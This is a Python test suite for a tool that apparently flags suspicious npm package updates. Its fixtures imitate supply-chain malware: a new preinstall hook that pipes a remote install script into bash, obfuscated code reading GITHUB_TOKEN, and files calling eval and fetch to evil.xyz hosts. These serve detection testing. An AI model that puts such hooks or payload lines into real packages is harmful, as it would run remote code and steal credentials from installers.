from argo.extract.dossier import SECTION_TITLES, build_dossier
from tests.helpers import make_pkg, pkg_json

OLD = make_pkg({"package.json": pkg_json("x", "1.0.0"), "dist/a.js": "module.exports = 1"})


def _w2_like():
    return make_pkg(
        {
            "package.json": pkg_json("x", "1.0.1", scripts={"preinstall": "node setup_bun.js"}),
            "dist/a.js": "module.exports = 1",
            "setup_bun.js": "require('child_process').execSync('curl -fsSL https://bun.sh/install | bash')",
            "bun_environment.js": ";".join(f"var _0x{i:04x}=1" for i in range(40))
            + ";process.env.GITHUB_TOKEN",
        }
    )


def test_w2_like_update():
    d = build_dossier("x@1.0.1", "x", "1.0.1", _w2_like(), OLD, "1.0.0")
    assert "TYPE: update from 1.0.0" in d.text
    assert "- script preinstall: node setup_bun.js  [NEW]" in d.text
    assert "curl -fsSL https://bun.sh/install" in d.text  # small target inlined
    cats = {h.category for h in d.hits}
    assert {"runtime_download", "exec", "credentials", "obfuscation"} <= cats
    assert d.lifecycle_changed and not d.truncated
    assert d.hits[0].path in ("package.json#scripts", "setup_bun.js")  # targets first


def test_w3_like_non_registry_dep_and_outside_file():
    new = make_pkg(
        {
            "package.json": pkg_json(
                "x",
                "1.0.1",
                files=["dist"],
                optionalDependencies={"@x/setup": "github:x/router#79ac"},
            ),
            "dist/a.js": "module.exports = 1",
            "router_init.js": "var a=1;" * 600,
        }
    )
    d = build_dossier("x@1.0.1", "x", "1.0.1", new, OLD, "1.0.0")
    assert "[NON-REGISTRY SOURCE, previously absent]" in d.text
    assert "added file outside declared `files`: router_init.js" in d.text
    assert "### router_init.js" in d.text and "profile: lines=" in d.text
    assert not d.lifecycle_changed and d.outside_files == ["router_init.js"]


def test_benign_update_with_unchanged_install_script():
    scripts = {"postinstall": "node install.js"}
    old = make_pkg(
        {"package.json": pkg_json("e", "1.0.0", scripts=scripts), "install.js": "download()"}
    )
    new = make_pkg(
        {"package.json": pkg_json("e", "1.0.1", scripts=scripts), "install.js": "download()"}
    )
    d = build_dossier("e@1.0.1", "e", "1.0.1", new, old, "1.0.0")
    assert "[unchanged]" in d.text and not d.lifecycle_changed


def test_new_package_and_missing_previous():
    pkg = make_pkg({"package.json": pkg_json("n", "9.9.9")})
    assert (
        "TYPE: new package (no previous version)"
        in build_dossier("n", "n", "9.9.9", pkg, None, None).text
    )
    t = build_dossier("n", "n", "9.9.9", pkg, None, "9.9.8").text
    assert "previous version not available" in t


def test_uniform_sections_even_when_empty():
    d = build_dossier("n", "n", "1", make_pkg({"package.json": pkg_json("n", "1")}), None, None)
    for title in SECTION_TITLES:
        assert title in d.text
    assert "- none" in d.text


def test_budget_truncates_and_reports():
    files = {"package.json": pkg_json("big", "1.0.0")}
    files |= {f"lib/f{i}.js": f"eval(x{i}); fetch('https://c{i}.evil.xyz')" for i in range(300)}
    d = build_dossier("big", "big", "1.0.0", make_pkg(files), None, None, budget_tokens=500)
    assert d.truncated and "omitted for length" in d.text
    assert d.est_tokens <= 500 + 60


def test_outside_files_vector_capped_to_10_largest():
    files = {
        "package.json": pkg_json("cap", "1.0.0", files=["dist"]),
        "dist/a.js": "module.exports = 1",
    }
    # 15 outside files with distinct, increasing sizes so "largest" is unambiguous.
    files |= {f"root{i}.js": "x" * (i + 1) * 100 for i in range(15)}
    d = build_dossier("cap", "cap", "1.0.0", make_pkg(files), None, None)
    largest_15_to_1 = [f"root{i}.js" for i in range(14, -1, -1)]
    shown = largest_15_to_1[:10]
    for name in shown:
        assert f"added file outside declared `files`: {name}" in d.text
    for name in largest_15_to_1[10:]:
        assert f"added file outside declared `files`: {name}" not in d.text
    assert "and 5 more files outside declared `files`" in d.text
    # Dossier.outside_files keeps the full, uncapped list.
    assert len(d.outside_files) == 15


def test_w2_like_with_many_outside_files_shows_signal_and_omission_markers():
    files = {
        "package.json": pkg_json(
            "w2big", "1.0.1", files=["dist"], scripts={"preinstall": "node setup_bun.js"}
        ),
        "dist/a.js": "module.exports = 1",
        "setup_bun.js": (
            "require('child_process').execSync('curl -fsSL https://bun.sh/install | bash')"
        ),
    }
    files |= {f"extra/f{i}.js": f"eval(x{i}); fetch('https://c{i}.evil.xyz')" for i in range(300)}
    d = build_dossier(
        "w2big@1.0.1", "w2big", "1.0.1", make_pkg(files), OLD, "1.0.0", budget_tokens=500
    )
    assert "- script preinstall: node setup_bun.js  [NEW]" in d.text
    assert "### setup_bun.js" in d.text
    assert "curl -fsSL https://bun.sh/install" in d.text
    assert "[exec]" in d.text or "[network]" in d.text  # at least one pattern line
    assert "- (" in d.text and "more lines omitted for length)" in d.text
    assert d.truncated


def test_outside_files_ranked_by_indicator_tier_not_size():
    # A tiny malicious payload.js sitting next to many larger, but benign, vendor
    # bundles must not be hidden by a size-based ranking: outside files are ordered by
    # a priority TIER (code with an indicator hit, then code without, then non-code),
    # size only breaking ties within a tier. payload.js is not referenced by any
    # lifecycle script (not a script target) and is far smaller than the vendor
    # bundles, so a size-first ranking pushes it out of the top MAX_OUTSIDE_FILES_SHOWN
    # slots entirely.
    payload = (
        "require('child_process').execSync("
        "'curl -fsSL https://bun.sh/install | bash'); "
        "process.env.GITHUB_TOKEN"
    )
    # Legitimate-looking vendor content that mentions fetch/process.env without
    # matching the (case-sensitive) indicator regexes: NODE_ENV is explicitly excluded
    # from the credentials pattern, and "window.fetch" has no "fetch(" substring.
    vendor_bundle = (
        "// polyfills window.fetch for older browsers\n"
        'if (process.env.NODE_ENV !== "production") { console.warn("dev build"); }\n'
    ) + "x" * 6200
    files = {
        "package.json": pkg_json("cap2", "1.0.0", files=["dist"]),
        "dist/a.js": "module.exports = 1",
        "payload.js": payload,
    }
    files |= {f"vendor/lib{i}.js": vendor_bundle for i in range(12)}
    d = build_dossier("cap2", "cap2", "1.0.0", make_pkg(files), None, None, budget_tokens=900)
    assert "### payload.js" in d.text  # profiled in section 2
    assert "[exec]" in d.text
    assert "[runtime_download]" in d.text
    assert "[credentials]" in d.text


def test_dedup_exec_hits_on_same_line():
    # "child_process" and "execSync(" both match the `exec` pattern on the same source
    # line; the dossier must collapse that into a single hit, not one per sub-match.
    pkg = make_pkg(
        {
            "package.json": pkg_json("y", "1.0.0", scripts={"preinstall": "node setup.js"}),
            "setup.js": "require('child_process').execSync('x')",
        }
    )
    d = build_dossier("y@1.0.0", "y", "1.0.0", pkg, None, None)
    exec_lines = [ln for ln in d.text.splitlines() if ln.startswith("- [exec] setup.js:1")]
    assert len(exec_lines) == 1
    exec_hits = [h for h in d.hits if (h.category, h.path, h.line) == ("exec", "setup.js", 1)]
    assert len(exec_hits) == 1
